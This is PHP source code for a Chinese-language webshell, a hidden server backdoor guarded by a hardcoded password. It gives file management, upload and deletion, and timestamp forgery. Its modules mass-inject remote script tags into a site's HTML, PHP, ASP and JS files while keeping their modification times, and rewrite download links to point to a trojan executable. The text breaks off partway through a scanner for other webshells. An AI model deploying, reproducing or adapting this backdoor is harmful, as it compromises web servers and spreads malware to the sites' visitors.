<?php
$password = "Skull."; error_reporting(E_ERROR); set_time_limit(0); $lanip = getenv('REMOTE_ADDR'); function Root_GP(&$array) { while(list($key,$var) = each($array)) { if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') { if(is_string($var)) $array[$key] = stripslashes($var); if(is_array($var)) $array[$key] = Root_GP($var); } } return $array; } function Root_CSS() { print<<<END
<style type="text/css">
	*{padding:0; margin:0;}
	body{background:threedface;font-family:"Verdana", "Tahoma", sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
	a{color:#000000;text-decoration:none;}
	a:hover{background:#33FF33;}
	table{color:#000000;font-family:"Verdana", "Tahoma", sans-serif;font-size:13px;border:1px solid #999999;}
	td{background:#F9F6F4;}
        .bt{background:#3d3d3d;color:#ffffff;border:2px;font:13px Arial,Tahoma;height:22px;}
	.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
	.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
	.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false; } function File_Str($string) { return str_replace('//','/',str_replace('\\','/',$string)); } function File_Size($size) { if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G'; elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M'; elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K'; else $size = $size . ' B'; return $size; } function File_Mode() { $RealPath = realpath('./'); $SelfPath = $_SERVER['PHP_SELF']; $SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/')); return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath))); } function File_Read($filename) { $handle = @fopen($filename,"rb"); $filecode = @fread($handle,@filesize($filename)); @fclose($handle); return $filecode; } function File_Write($filename,$filecode,$filemode) { $handle = @fopen($filename,$filemode); $key = @fwrite($handle,$filecode); if(!$key) { @chmod($filename,0666); $key = @fwrite($handle,$filecode); } @fclose($handle); return $key; } function File_Up($filea,$fileb) { $key = @copy($filea,$fileb) ? true : false; if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false; return $key; } function File_Down($filename) { if(!file_exists($filename)) return false; $filedown = basename($filename); $array = explode('.', $filedown); $arrayend = array_pop($array); header('Content-type: application/x-'.$arrayend); header('Content-Disposition: attachment; filename='.$filedown); header('Content-Length: '.filesize($filename)); @readfile($filename); exit; } function File_Deltree($deldir) { if(($mydir = @opendir($deldir)) == NULL) return false; while(false !== ($file = @readdir($mydir))) { $name = File_Str($deldir.'/'.$file); if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);rmdir($name);} if(is_file($name)){@chmod($name,0777);@unlink($name);} } @closedir($mydir); @chmod($deldir,0777); return @rmdir($deldir) ? true : false; } function File_Act($array,$actall,$inver) { if(($count = count($array)) == 0) return 'select file plz'; $i = 0; while($i < $count) { $array[$i] = urldecode($array[$i]); switch($actall) { case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制'; break; case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break; case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '错误属性值'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '改变属性'; break; case "d" : @touch($array[$i],strtotime($inver)); $msg = '改变时间'; break; } $i++; } return '选择文件 '.$msg.' 成功'; } function File_Edit($filepath,$filename,$dim = '') { $THIS_DIR = urlencode($filepath); $THIS_FILE = File_Str($filepath.'/'.$filename); if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));} else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';} print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert('wrong time!format:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('editor').submit();}
}
</script>
<div class="actall">search content: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type='button' value="search" onclick="search(searchs.value)"></div>
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">change file time <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
<div class="actall"><input class="bt" type="button" value="save" onclick="CheckDate();">
<input class="bt" type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';"></div>
</form>
END;
} function File_a($p) { $MSG_BOX = '等待消息队列......'; if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/'; $UP_DIR = urlencode(File_Str($p.'/..')); $REAL_DIR = File_Str(realpath($p)); $FILE_DIR = File_Str(dirname(__FILE__)); $ROOT_DIR = File_Mode(); $THIS_DIR = urlencode(File_Str($p)); $UP_DIR = urlencode(File_Str(dirname($p))); $NUM_D = 0; $NUM_F = 0; if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' success' : '编辑文件 '.$_POST['pfn'].' faild';@touch($_POST['pfn'],$intime);} if(!empty($_POST['ufs'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($p.'/'.$upfilename)) ? 'upfile '.$upfilename.' success' : 'upfile '.$upfilename.' ';} if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);} if(!empty($_GET['mn'])){$MSG_BOX = @rename(File_Str($p.'/'.$_GET['mn']),File_Str($p.'/'.$_GET['rn'])) ? '重命名 '.$_GET['mn'].' to '.$_GET['rn'].' success' : '重命名 '.$_GET['mn'].' to '.$_GET['rn'].' faild';} if(!empty($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($p.'/'.$_GET['dn']),0777) ? 'create folder '.$_GET['dn'].' success' : 'create folder '.$_GET['dn'].' faild';} if(!empty($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除文件夹 '.$_GET['dd'].' 成功' : '删除文件夹 '.$_GET['dd'].' 失败';} if(!empty($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'the download file does not exists';} Root_CSS(); print<<<END
<script type="text/javascript">
	function Inputok(msg,gourl)
	{
		smsg = "current file:[" + msg + "]";
		re = prompt(smsg,unescape(msg));
		if(re)
		{
			var url = gourl + escape(re);
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "sure for del [" + unescape(msg) + "] ?";
		if(confirm(smsg))
		{
			if(gourl == 'b'){document.getElementById('actall').value = escape(gourl);document.getElementById('fileall').submit();}
			else window.location = gourl;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "current file time:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert('time error!format:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = escape(re);
			document.getElementById('fileall').submit();
		}
	}
</script>
	<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
	<div class="actall" style="text-align:center;padding:3px;">
	<form method="GET"><input type="hidden" name="s" value="a">
	<input type="text" name="p" value="{$p}" style="width:50%;height:22px;">
	<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
	<option>---特殊目录---</option>
	<option value="{$ROOT_DIR}"> 站点根目录 </option>
	<option value="{$FILE_DIR}"> 本程序目录 </option>
	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动"> 中文启动项目录 </option>
	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> 英文启动项目录 </option>
	<option value="C:/RECYCLER"> RECYCLER </option>
	<option value="C:/Program Files"> Program Files </option>
	</select> <input class="bt" type="submit" value="转到"></form>
	<div style="margin-top:3px;"></div>
	<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
	<input class="bt" type="button" value="创建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
	<input class="bt" type="button" value="创建文件夹" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
	<input type="file" name="ufp" style="width:30%;height:22px;">
	<input type="text" name="ufn" style="width:20%;height:22px;">
	<input class="bt" type="submit" name="ufs" value="上传">
	</form>
	</div>
	<form method="POST" id="fileall" action="?s=a&p={$THIS_DIR}">
	<table border="0"><tr>
	<td class="toptd" style="width:810px;"> <a href="?s=a&p={$UP_DIR}"><b>上一级目录</b></a> </td>
	<td class="toptd" style="width:100px;"> 操作 </td>
	<td class="toptd" style="width:60px;"> 属性 </td>
	<td class="toptd" style="width:200px;"> 修改时间 </td>
	<td class="toptd" style="width:100px;"> 大小 </td></tr>
END;
if(($h_d = @opendir($p)) == NULL) return false; while(false !== ($Filename = @readdir($h_d))) { if($Filename == '.' or $Filename == '..') continue; $Filepath = File_Str($p.'/'.$Filename); if(is_dir($Filepath)) { $Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4); $Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath)); $Filepath = urlencode($Filepath); echo "\n".'<tr><td><a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b>'.$Filename.'</b></a></td>'; $Filename = urlencode($Filename); echo '<td><a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;">删除</a> '; echo '<a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;">重命名</a></td>'; echo '<td><a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;">'.$Fileperm.'</a></td>'; echo '<td>'.$Filetime.'</td> '; echo '<td> </td></tr>'."\n"; $NUM_D++; } } @rewinddir($h_d); while(false !== ($Filename = @readdir($h_d))) { if($Filename == '.' or $Filename == '..') continue; $Filepath = File_Str($REAL_DIR.'/'.$Filename); if(!is_dir($Filepath)) { $Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$Filepath); $Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4); $Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath)); $Filesize = File_Size(@filesize($Filepath)); if($Filepath == File_Str(__FILE__)) $fname = '<font color="#FF0000">'.$Filename.'</font>'; else $fname = $Filename; echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>'; $Filepath = urlencode($Filepath); $Filename = urlencode($Filename); echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> 编辑 </a> '; echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 重命名 </a> </td>'; echo ' <td>'.$Fileperm.'</td> '; echo ' <td>'.$Filetime.'</td> '; echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n"; $NUM_F++; } } @closedir($h_d); print<<<END
</table>
<div class="actall"><input type="hidden" name="actall" value="undefined">
<input type="hidden" name="inver" value="undefined">
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input class="bt" type="button" value="复制" onclick="SubmitUrl('copy selected files to folder: ','{$THIS_DIR}','a');return false;"> 
<input class="bt" type="button" value="删除" onclick="Delok('selected files','b');return false;"> 
<input class="bt" type="button" value="属性" onclick="SubmitUrl('change selected files attr value: ','0666','c');return false;"> 
<input class="bt" type="button" value="时间" onclick="CheckDate('2010-04-21 17:31:20','d');return false;"> 
文件夹({$NUM_D}) / 文件({$NUM_F})</div>
</form>
END;
return true; } function Guama_Pass($length) { $possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; $str = ""; while(strlen($str) < $length) $str .= substr($possible,(rand() % strlen($possible)),1); return $str; } function Guama_Auto($gp,$gt,$gl,$gc,$incode,$gk,$gd,$gb,$go) { if(($h_d = @opendir($gp)) == NULL) return false; if($go) { preg_match_all("/\[\-([^~]*?)\-\]/i",$gc,$nc); $passm = (int)$nc[1][0]; if((!eregi("^[0-9]{1,2}$",$nc[1][0])) || ($passm > 12)) return false; } while(false !== ($Filename = @readdir($h_d))) { if($Filename == '.' || $Filename == '..') continue; if($gl != ''){if(eregi($gl,$Filename)) continue;} $Filepath = File_Str($gp.'/'.$Filename); if(is_dir($Filepath) && $gb) Guama_Auto($Filepath,$gt,$gl,$gc,$incode,$gk,$gd,$gb,$go); if(eregi($gt,$Filename)) { $ic = File_Read($Filepath); if(stristr($ic,$gk)) continue; if($go) $gc = str_replace($nc[0][0],Guama_Pass($passm),$gc); if($gd) $ftime = @filemtime($Filepath); if($incode == '1'){if(!stristr($ic,'</head>')) continue; $ic = str_replace('</head>',"\r\n".$gc."\r\n".'</head>'."\r\n",$ic); $ic = str_replace('</HEAD>',"\r\n".$gc."\r\n".'</HEAD>'."\r\n",$ic);} if($incode == '2') $ic = $gc."\r\n".$ic; if($incode == '3') $ic = $ic."\r\n".$gc; echo File_Write($Filepath,$ic,'wb') ? 'ok:'.$Filepath.'<br>'."\r\n" : 'err:'.$Filepath.'<br>'."\r\n"; if($gd) @touch($Filepath,$ftime); ob_flush(); flush(); } } @closedir($h_d); return true; } function Guama_b() { if((!empty($_POST['gp'])) && (!empty($_POST['gt'])) && (!empty($_POST['gc']))) { $gk = ''; $go = false; $gt = str_replace('.','\\.',$_POST['gt']); $gl = isset($_POST['gl']) ? str_replace('.','\\.',$_POST['gl']) : ''; $gd = isset($_POST['gd']) ? true : false; $gb = ($_POST['gb'] == 'a') ? true : false; if(isset($_POST['gx'])){$gk = $_POST['gc'];if(stristr($_POST['gc'],'[-') && stristr($_POST['gc'],'-]')){$temp = explode('[-',$_POST['gc']); $gk = $temp[0]; $go = true;}} echo Guama_Auto($_POST['gp'],$gt,$gl,$_POST['gc'],$_POST['incode'],$gk,$gd,$gb,$go) ? '成功' : '失败'; echo '<br><input class="bt" type="button" value="返回" onclick="history.back();">'; return false; } $FILE_DIR = File_Str(dirname(__FILE__)); $ROOT_DIR = File_Mode(); print<<<END
<script language="javascript">
function Fulll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";sform.gp.value = Str[i];}
  else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";sform.gt.value = Str[i];}
  return true;
}
function autorun(){
	if(document.getElementById('gp').value == ''){alert('路径不能为空');return false;}
	if(document.getElementById('gt').value == ''){alert('类型不能为空');return false;}
	if(document.getElementById('gc').value == ''){alert('代码不能为空');return false;}
	document.getElementById('sform').submit();
}
</script>
<form method="POST" name="sform" id="sform" action="?s=b">
<div class="actall" style="height:35px;">挂马路径: <input type="text" name="gp" id="gp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
<option value="0" selected>--范围选择--</option>
<option value="1">站点根目录</option>
<option value="2">本程序目录</option>
</select></div>
<div class="actall" style="height:35px;">文件类型: <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
<option value="0" selected>--类型选择--</option>
<option value="3">html</option>
<option value="4">script+html</option>
<option value="5">JS</option>
</select></div>
<div class="actall" style="height:35px;">过滤对象: <input type="text" name="gl" value="templet|templets|default|editor|fckeditor.html" style="width:500px;" disabled>
<input type="radio" name="inout" onclick="gl.disabled=false;">开启 <input type="radio" name="inout" onclick="gl.disabled=true;" checked>关闭</div>
<div class="actall">挂马代码: <textarea name="gc" id="gc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js?[-6-]"&gt;&lt;/script&gt;</textarea>
<div class="msgbox">挂马变形说明: 程序自动寻找[-6-]标签,替换为随机字符,6表示六位随机字符,最大12位,如果不变形可以不加[-6-]标签.
<br>Example: &lt;script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"&gt;&lt;/script&gt;</div></div>
<div class="actall" style="height:35px;"><input type="radio" name="incode" value="1" checked>插入&lt;/head&gt标签之前; 
<input type="radio" name="incode" value="2">插入文件最顶端 
<input type="radio" name="incode" value="3">插入文件最末尾</div>
<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>智能过滤重复代码 <input type="checkbox" name="gd" value="1" checked>保持文件修改时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>将挂马应用于该文件夹,子文件夹和文件
<br><input type="radio" name="gb" value="b">仅将挂马应用于该文件夹</div>
<div class="actall"><input class="bt" type="button" value="开始挂马" onclick="autorun();"></div>
</form>
END;
return true; } function Qingma_Auto($qp,$qt,$qc,$qd,$qb) { if(($h_d = @opendir($qp)) == NULL) return false; while(false !== ($Filename = @readdir($h_d))) { if($Filename == '.' || $Filename == '..') continue; $Filepath = File_Str($qp.'/'.$Filename); if(is_dir($Filepath) && $qb) Qingma_Auto($Filepath,$qt,$qc,$qd,$qb); if(eregi($qt,$Filename)) { $ic = File_Read($Filepath); if(!stristr($ic,$qc)) continue; $ic = str_replace($qc,'',$ic); if($qd) $ftime = @filemtime($Filepath); echo File_Write($Filepath,$ic,'wb') ? 'ok:'.$Filepath.'<br>'."\r\n" : 'err:'.$Filepath.'<br>'."\r\n"; if($qd) @touch($Filepath,$ftime); ob_flush(); flush(); } } @closedir($h_d); return true; } function Qingma_c() { if((!empty($_POST['qp'])) && (!empty($_POST['qt'])) && (!empty($_POST['qc']))) { $qt = str_replace('.','\\.',$_POST['qt']); $qd = isset($_POST['qd']) ? true : false; $qb = ($_POST['qb'] == 'a') ? true : false; echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? '成功' : '失败'; echo '<br><input class="bt" type="button" value="返回" onclick="history.back();">'; return false; } $FILE_DIR = File_Str(dirname(__FILE__)); $ROOT_DIR = File_Mode(); print<<<END
<script language="javascript">
function Fullll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";xform.qp.value = Str[i];}
	else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";xform.qt.value = Str[i];}
  return true;
}
function autoup(){
	if(document.getElementById('qp').value == ''){alert('文件路劲不能为空');return false;}
	if(document.getElementById('qt').value == ''){alert('文件类型不能为空');return false;}
	if(document.getElementById('qc').value == ''){alert('代码不能为空');return false;}
	document.getElementById('xform').submit();
}
</script>
<form method="POST" name="xform" id="xform" action="?s=c">
<div class="actall" style="height:35px;">清马路径: <input type="text" name="qp" id="qp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--选择范围--</option>
<option value="1">站点根目录</option>
<option value="2">本程序目录</option>
</select></div>
<div class="actall" style="height:35px;">文件类型: <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--选择类型--</option>
<option value="3">html</option>
<option value="4">script+html</option>
<option value="5">js</option>
</select></div>
<div class="actall">清除代码 <textarea name="qc" id="qc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js"&gt;&lt;/script&gt;</textarea></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>保持文件修改时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>将清马应用于该文件夹,子文件夹和文件
<br><input type="radio" name="qb" value="b">仅将清马应用于该文件夹</div>
<div class="actall"><input class="bt" type="button" value="开始清马" onclick="autoup();"></div>
</form>
END;
return true; } function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb) { if(($h_d = @opendir($tp)) == NULL) return false; while(false !== ($Filename = @readdir($h_d))) { if($Filename == '.' || $Filename == '..') continue; $Filepath = File_Str($tp.'/'.$Filename); if(is_dir($Filepath) && $tb) Tihuan_Auto($Filepath,$tt,$th,$tca,$tcb,$td,$tb); $doing = false; if(eregi($tt,$Filename)) { $ic = File_Read($Filepath); if($th) { if(!stristr($ic,$tca)) continue; $ic = str_replace($tca,$tcb,$ic); $doing = true; } else { preg_match_all("/\<a href\=\"([^~]*?)\"/i",$ic,$nc); for($i = 0;$i < count($nc[1]);$i++){if(eregi($tca,$nc[1][$i])){$ic = str_replace($nc[1][$i],$tcb,$ic);$doing = true;}} } if($td) $ftime = @filemtime($Filepath); if($doing) echo File_Write($Filepath,$ic,'wb') ? 'ok:'.$Filepath.'<br>'."\r\n" : 'err:'.$Filepath.'<br>'."\r\n"; if($td) @touch($Filepath,$ftime); ob_flush(); flush(); } } @closedir($h_d); return true; } function Tihuan_d() { if((!empty($_POST['tp'])) && (!empty($_POST['tt']))) { $tt = str_replace('.','\\.',$_POST['tt']); $td = isset($_POST['td']) ? true : false; $tb = ($_POST['tb'] == 'a') ? true : false; $th = ($_POST['th'] == 'a') ? true : false; if($th) $_POST['tca'] = str_replace('.','\\.',$_POST['tca']); echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '成功' : '失败'; echo '<br><input class="bt" type="button" value="返回" onclick="window.location=\'?s=d\'">'; return false; } $FILE_DIR = File_Str(dirname(__FILE__)); $ROOT_DIR = File_Mode(); print<<<END
<script language="javascript">
function Fulllll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";tform.tp.value = Str[i];}
	else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";tform.tt.value = Str[i];}
  return true;
}
function showth(th){
	if(th == 'a') document.getElementById('setauto').innerHTML = '<tr>Searchment</tr> <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Replacement <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br><tr>Download Suffix</tr> <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>&nbsp&nbsp&nbspReplacement&nbsp&nbsp&nbsp<input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
	if(document.getElementById('tp').value == ''){alert('文件路径不能为空');return false;}
	if(document.getElementById('tt').value == ''){alert('文件类型不能为空');return false;}
	if(document.getElementById('tca').value == '' || document.getElementById('tcb').value == ''){alert('替换内容不能为空');return false;}
	document.getElementById('tform').submit();
}
</script>
<form method="POST" name="tform" id="tform" action="?s=d">
<div class="actall" style="height:35px;">替换路径: <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fulllll(options[selectedIndex].value)'>
<option value="0" selected>--选择范围--</option>
<option value="1">站点根目录</option>
<option value="2">本程序目录</option>
</select></div>
<div class="actall" style="height:35px;">Type: <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fulllll(options[selectedIndex].value)'>
<option value="0" selected>--选择类型--</option>
<option value="3">html</option>
<option value="4">script+html</option>
<option value="5">js</option>
</select></div>
<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>替换文件中的指定内容 <input type="radio" name="th" value="b" onclick="showth('b')">替换文件中的下载地址<br>
<div id="setauto">查找内容:&nbsp <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>替换成为: <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>保持文件修改时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>将替换应用于该文件夹,子文件夹和文件
<br><input type="radio" name="tb" value="b">仅将替换应用于该文件夹</div>
<div class="actall"><input class="bt" type="button" value="开始替换" onclick="autoup();"></div>
</form>
END;
return true; } function Antivirus_Auto($sp,$features,$st) { if(($h_d = @opendir($sp)) == NULL) return false; $ROOT_DIR = File_Mode(); while(false !== ($Filename = @readdir($h_d))) { if($Filename == '.' || $Filename == '..') continue; $Filepath = File_Str($sp.'/'.$Filename); if(is_dir($Filepath)) Antivirus_Auto($Filepath,$features,$st); if(eregi($st,$Filename)) { if($Filepath == File_Str(__FILE__)) continue; $ic = File_Read($Filepath); foreach($features as $var => $key) { if(stristr($ic,$key)) { $Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath); $Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath)); echo '<a href="'.$Fileurls.'" target="_blank"><font color="#FF0000">'.$Filepath.'</font></a><br>【<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank">编辑</a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank">删除</a>】 '; echo '【'.$Filetime.'】 <font color="#FF0000">'.$var.'</font><br><br>'; break; } } ob_flush(); flush(); } } @closedir($h_d); return true; } function Antivirus_e() { if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo ' <font style=font:11pt color=ff0000>删除成功</font>';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? ' <font style=font:11pt color=ff0000>删除成功</font>' : ' <font style=font:11pt color=ff0000>删除失败</font>';} return false;} if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; } $SCAN_DIR = (File_Mode() == '') ? File_Str(dirname(__FILE__)) : File_Mode(); $features_php = array('ftp.class.php'=>'ftp.class.php','cha88.cn'=>'cha88.cn','Security Angel Team'=>'Security Angel Team','read()'=>'->read()','readdir'=>'readdir(','return string soname'=>'returns string soname','eval()'=>'eval(gzinflate(','eval(base64_decode())'=>'eval(base64_decode(','eval($_POST)'=>'eval($_POST','eval($_REQUEST)'=>'eval($_REQUEST','eval ($_)'=>'eval ($_','copy()'=>'copy($_FILES','copy ()'=>'copy ($_FILES','move_uploaded_file()'=>'move_uploaded_file($_FILES','move_uploaded_file ()'=>'move_uploaded_file ($_FILES','str_replace()'=>'str_replace(\'\\\\\',\'/\','); $features_asx = array('绝对路径'=>'绝对路径','输入马的内容'=>'输入马的内容','fso.createtextfile()'=>'fso.createtextfile(path,true)','<%execute(request())%>'=>'<%execute(request','<%eval request()%>'=>'<%eval request','execute session()'=>'execute session(','--Created!'=>'--Created!','WScript.Shell'=>'WScript.Shell','<%s LANGUAGE = VBScript.Encode %>'=>'<%@ LANGUAGE = VBScript.Encode %>','www.rootkit.net.cn'=>'www.rootkit.net.cn','Process.GetProcesses'=>'Process.GetProcesses','lake2'=>'lake2'); print<<<END
<div class="actall" style="height:100px;"><form method="POST" name="tform" id="tform" action="?s=e">
扫描路径: <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:400px;">
<select name="st">
<option value="php">phpshell</option>
<option value="asx">aspshell+aspxshell</option>
<option value="ppp">phpshell+aspshell+aspxshell</option>
</select>
<input class="bt" type="submit" value="开始扫描">
</form><br>
END;
